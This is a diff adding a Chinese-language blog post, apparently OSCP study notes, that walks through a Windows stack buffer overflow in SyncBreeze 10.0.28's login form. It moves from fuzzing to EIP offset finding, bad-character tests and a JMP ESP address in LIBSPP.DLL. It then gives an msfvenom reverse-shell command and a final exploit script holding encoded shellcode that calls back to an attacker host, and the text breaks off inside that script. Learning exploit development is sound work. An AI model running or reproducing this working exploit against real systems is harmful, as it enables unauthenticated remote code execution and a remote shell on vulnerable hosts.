@@ -1,0 +1,771 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <link rel="icon" href="https://avatars.githubusercontent.com/u/62293120?v=4">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="C47Sh4rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Windows缓冲区溢出相关">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows缓冲区溢出">
+<meta property="og:url" content="https://c47sh4rk.github.io/2022/08/13/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="C47Sh4rk&#39;s Blog">
+<meta property="og:description" content="Windows缓冲区溢出相关">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813204004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815093802.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815095625.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815104836.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105404.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105513.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105724.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815110549.png">
+<meta property="article:published_time" content="2022-08-13T11:41:34.000Z">
+<meta property="article:modified_time" content="2023-02-26T08:05:47.000Z">
+<meta property="article:author" content="C47Sh4rk">
+<meta property="article:tag" content="OSCP">
+<meta property="article:tag" content="漏洞挖掘">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813204004.png">
+  
+  
+  
+  <title>Windows缓冲区溢出 - C47Sh4rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"c47sh4rk.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>C47Sh4rk&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/0%20(2).png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Windows缓冲区溢出"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-13 19:41" pubdate>
+          2022年8月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          64 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Windows缓冲区溢出</h1>
+            
+            <div class="markdown-body">
+              
+              <h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><ol>
+<li>在不接触源码的情况下发现漏洞</li>
+<li>发现所有的数据提交入口</li>
+<li>检测提交数据对堆栈内存的影响</li>
+<li>篡改内存实现远程代码执行</li>
+</ol>
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="漏洞挖掘方法"><a href="#漏洞挖掘方法" class="headerlink" title="漏洞挖掘方法"></a>漏洞挖掘方法</h3><ul>
+<li>源码审计分析</li>
+<li>逆向分析</li>
+<li>模糊测试<ul>
+<li>提交随机、半随机数据, 观察程序如何处理(崩溃)</li>
+</ul>
+</li>
+<li>协议指令</li>
+<li>fuzzer生成畸形的输入数据</li>
+<li>Debugger跟踪分析堆栈、寄存器、程序流的变化记</li>
+</ul>
+<h3 id="HTTP协议模糊测试"><a href="#HTTP协议模糊测试" class="headerlink" title="HTTP协议模糊测试"></a>HTTP协议模糊测试</h3><ul>
+<li>SyncBreeze version 10.0.28 无需身份认证缓冲区溢出漏洞(2017)</li>
+<li>开启服务Options &#x3D;&gt; Server &#x3D;&gt; Enable Web Server On Port:80</li>
+<li>Fuzz所有数据提交入口(表单域)</li>
+<li>Wireshark抓取流量, 然后登录表单, 还原TCP流, 获取认证请求<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.11.0.22<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.11.0.22/login<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br>username=AAAA&amp;password=BBBB<br></code></pre></td></tr></table></figure></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python import socket</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nSending evil buffer...&quot;</span><br>    <br>    size = <span class="hljs-number">100</span><br>    <br>    inputBuffer = <span class="hljs-string">&quot;A&quot;</span> * size<br>    <br>    content = <span class="hljs-string">&quot;username=&quot;</span> + inputBuffer + <span class="hljs-string">&quot;&amp;password=A&quot;</span><br>    buffer = <span class="hljs-string">&quot;POST /login HTTP/1.1\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Host: 10.11.0.22\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Connection: close\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Content-Length: &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content))+<span class="hljs-string">&quot;\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;\r\n&quot;</span><br>    buffer += content<br><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <br>    s.connect((<span class="hljs-string">&quot;10.11.0.22&quot;</span>, <span class="hljs-number">80</span>))<br>    s.send(buffer)<br>    <br>    s.close()<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nDone!&quot;</span><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Could not connect!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="溢出攻击"><a href="#溢出攻击" class="headerlink" title="溢出攻击"></a>溢出攻击</h2><h3 id="控制EIP寄存器"><a href="#控制EIP寄存器" class="headerlink" title="控制EIP寄存器"></a>控制EIP寄存器</h3><ul>
+<li>SyncBreeze编译不支持DEP、ASLR、CFG<ul>
+<li>DEP: 是一组对内存执行额外检查的硬件和软件技术, 帮助防止从数据页执行代码</li>
+<li>ASLR: 每次系统启动时, 将加载的应用程序和dll的基址随机化</li>
+<li>CFG: 执行间接代码分支的验证, 防止函数指针的重写</li>
+</ul>
+</li>
+<li>使用msf-pattern_create生成<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813204004.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><ul>
+<li>重启程序、运行PoC, EIP寄存器中发现4个字节内容42306132 &#x3D;&gt; B0aB</li>
+<li>定位以上4字节内容在800字节序列中的偏移位置<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815093802.png" srcset="/img/loading.gif" lazyload></li>
+<li>修改代码在780偏移后添加0x42424242 &#x3D;&gt; BBBB, 验证其精准写入EIP寄存器</li>
+<li>为Shellcode定位存放空间<ul>
+<li>观察上一步PoC执行结果, 发现43434343 &#x3D;&gt; CCCC…, 因此计划将shellcode写入ESP</li>
+<li>标准反弹shell需要约350-400字节存储空间, 因此注入更多数据, 测定可写空间够shellcode用</li>
+<li>可写空间为(0x030E771C - 0x030E745C)</li>
+<li>重复测试, 发现ESP指向的内存地址每次都发生变化</li>
+</ul>
+</li>
+</ul>
+<h3 id="测定坏字符"><a href="#测定坏字符" class="headerlink" title="测定坏字符"></a>测定坏字符</h3><ul>
+<li>基于不同的程序、协议、漏洞类型, 某些坏字符不能用于缓冲区、返回地址、shellcode中</li>
+<li>向缓冲区注入0x00 - 0xFF编码的所有字符, 并查看程序如何处理每个字符</li>
+<li>执行Poc后, 右击ESP选择Follow in Dump显示内存中的输入字符<ul>
+<li>发现0x0A字符消失 -&gt; 坏字符</li>
+<li>以此类推修改badchars, 最终发现0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D是坏字符<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">import</span> socket<br>badchars = (<br><span class="hljs-string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span><br><span class="hljs-string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span><br><span class="hljs-string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span><br><span class="hljs-string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="hljs-string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span><br><span class="hljs-string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span><br><span class="hljs-string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span><br><span class="hljs-string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span><br><span class="hljs-string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span><br><span class="hljs-string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span><br><span class="hljs-string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span><br><span class="hljs-string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span><br><span class="hljs-string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span><br><span class="hljs-string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span><br><span class="hljs-string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span><br><span class="hljs-string">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nSending evil buffer...&quot;</span><br>    filler = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">780</span><br>    eip = <span class="hljs-string">&quot;B&quot;</span> * <span class="hljs-number">4</span><br>    offset = <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">4</span><br><br>    inputBuffer = filler + eip + offset + badchars<br>    content = <span class="hljs-string">&quot;username=&quot;</span> + inputBuffer + <span class="hljs-string">&quot;&amp;password=A&quot;</span><br>...<br></code></pre></td></tr></table></figure>
+<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815095625.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<h3 id="重定向执行流"><a href="#重定向执行流" class="headerlink" title="重定向执行流"></a>重定向执行流</h3><ul>
+<li>LIBSPP.DLL满足要求。找到此模块中JMP ESP指令地址</li>
+<li>mona.py可以搜索汇编指令二进制和十六进制的编码心事(opcode)</li>
+<li>将JMP ESP执行转换为opcode<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815104836.png" srcset="/img/loading.gif" lazyload></li>
+<li>在LIBSPP.DLL的所有区块搜索JMP ESP(0xFFE4)<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105404.png" srcset="/img/loading.gif" lazyload><br><strong>找到所有安全机制为False的</strong></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105513.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>要在反汇编器窗口中查看 0x10090c83 的内容，在执行暂停时，我们将单击“Go to address in Disassembler”按钮（图 219）并输入地址。从这里我们可以看到它确实转换为 JMP ESP 指令。<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105724.png" srcset="/img/loading.gif" lazyload><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br>filler = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">780</span><br>eip = <span class="hljs-string">&quot;\x83\x0c\x09\x10&quot;</span>  <span class="hljs-comment"># 倒着写</span><br>offset = <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">4</span><br>buffer = <span class="hljs-string">&quot;D&quot;</span> * (<span class="hljs-number">1500</span> - <span class="hljs-built_in">len</span>(filler) - <span class="hljs-built_in">len</span>(eip) - <span class="hljs-built_in">len</span>(offset))<br>inputBuffer = filler + eip + offset + buffer<br>...<br></code></pre></td></tr></table></figure></li>
+<li>msf生成payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x 86/shikata_ga_nai -b <span class="hljs-string">&quot;\x00\x0a\x0d\x25\x26\x2b\x3d&quot;</span> <span class="hljs-comment"># -b 排除坏字符</span><br></code></pre></td></tr></table></figure></li>
+<li>最终poc<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python import socket</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nSending evil buffer...&quot;</span><br>    <br>    shellcode = (<br>    <span class="hljs-string">&quot;\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;</span><br>    <span class="hljs-string">&quot;\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a&quot;</span><br>    <span class="hljs-string">&quot;\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59&quot;</span><br>    <span class="hljs-string">&quot;\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48&quot;</span><br>    <span class="hljs-string">&quot;\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f&quot;</span><br>    <span class="hljs-string">&quot;\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6&quot;</span><br>    <span class="hljs-string">&quot;\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4&quot;</span><br>    <span class="hljs-string">&quot;\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff&quot;</span><br>    <span class="hljs-string">&quot;\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1&quot;</span><br>    <span class="hljs-string">&quot;\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8&quot;</span><br>    <span class="hljs-string">&quot;\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2&quot;</span><br>    <span class="hljs-string">&quot;\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62&quot;</span><br>    <span class="hljs-string">&quot;\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e&quot;</span><br>    <span class="hljs-string">&quot;\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2&quot;</span><br>    <span class="hljs-string">&quot;\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e&quot;</span><br>    <span class="hljs-string">&quot;\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49&quot;</span><br>    <span class="hljs-string">&quot;\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70&quot;</span><br>    <span class="hljs-string">&quot;\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23&quot;</span><br>    <span class="hljs-string">&quot;\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f&quot;</span><br>    <span class="hljs-string">&quot;\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56&quot;</span><br>    <span class="hljs-string">&quot;\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8&quot;</span><br>    <span class="hljs-string">&quot;\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b&quot;</span><br>    <span class="hljs-string">&quot;\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6&quot;</span><br>    <span class="hljs-string">&quot;\x5f\xa3\x05\x74\x5f\xe6&quot;</span>)<br>    filler = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">780</span><br>    eip = <span class="hljs-string">&quot;\x83\x0c\x09\x10&quot;</span><br>    offset = <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">4</span><br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    一系列无操作（或 NOP）指令，其操作码值为 0x90。顾名思义，这些指令什么都不做，只是将执行传递给下一条指令。以这种方式使用，这些指令，也定义为 NOP sled 或 NOP slide，将让 CPU “滑动”通过 NOP，直到到达有效负载。</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    nops = <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">10</span><br>    <br>    inputBuffer = filler + eip + offset + nops + shellcode<br>    <br>    content = <span class="hljs-string">&quot;username=&quot;</span> + inputBuffer + <span class="hljs-string">&quot;&amp;password=A&quot;</span><br>    buffer = <span class="hljs-string">&quot;POST /login HTTP/1.1\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Host: 